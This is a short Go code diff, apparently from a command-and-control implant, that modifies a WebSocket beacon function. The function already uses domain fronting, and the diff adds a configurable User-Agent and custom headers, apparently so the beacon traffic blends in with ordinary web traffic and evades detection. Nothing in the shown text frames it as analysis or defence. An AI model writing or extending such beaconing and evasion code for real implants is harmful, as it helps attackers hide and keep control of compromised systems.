@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"net/http"
 	"net/url"
+	"strings"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -47,6 +48,13 @@ func sendWSSBeacon(body []byte) []byte {
 		header := http.Header{}
 		if DomainFront != "" {
 			header.Set("Host", DomainFront)
+		}
+		header.Set("User-Agent", getActiveUserAgentFromConfig())
+		for k, v := range getActiveHeaders() {
+			if strings.EqualFold(k, "User-Agent") {
+				continue
+			}
+			header.Set(k, v)
 		}
 
 		conn, _, err := dialer.Dial(wsURL, header)
